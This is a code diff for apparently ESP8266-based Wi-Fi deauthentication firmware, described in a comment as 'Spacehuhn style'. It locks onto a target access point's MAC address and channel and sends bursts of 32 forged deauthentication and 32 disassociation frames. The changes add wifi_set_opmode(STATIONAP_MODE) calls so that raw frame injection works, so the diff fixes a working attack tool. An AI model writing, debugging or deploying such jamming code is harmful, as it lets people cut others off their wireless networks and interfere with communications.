@@ -42,7 +42,11 @@ static uint8_t deauthPkt[26];
 static uint8_t disassocPkt[26];
 
 // Build templates - exact Spacehuhn style
+// CRITICAL: wifi_send_pkt_freedom requires STATIONAP_MODE (0x03)
 void initDeauthFrame() {
+  // Set WiFi mode to STATIONAP_MODE - REQUIRED for wifi_send_pkt_freedom
+  wifi_set_opmode(STATIONAP_MODE);
+  
   memset(deauthPkt, 0, sizeof(deauthPkt));
   deauthPkt[0] = 0xC0;       // Type=0 (Mgmt), Subtype=12 (Deauth)
   deauthPkt[1] = 0x00;
@@ -94,6 +98,9 @@ inline void sendDisassocFrame() {
 
 // Lock channel + target
 void lockTarget(const uint8_t* mac, uint8_t chan) {
+  // CRITICAL: Ensure STATIONAP_MODE for wifi_send_pkt_freedom
+  wifi_set_opmode(STATIONAP_MODE);
+  
   memcpy(targetMac, mac, 6);
   targetChan = chan;
   patchBssid(mac);
@@ -105,6 +112,9 @@ void lockTarget(const uint8_t* mac, uint8_t chan) {
 
 // One burst = 32 deauth + 32 disassoc
 void sendBurst() {
+  // Ensure WiFi mode before sending
+  wifi_set_opmode(STATIONAP_MODE);
+  
   // Deauth burst
   for (int i = 0; i < 32; i++) {
     sendDeauthFrame();
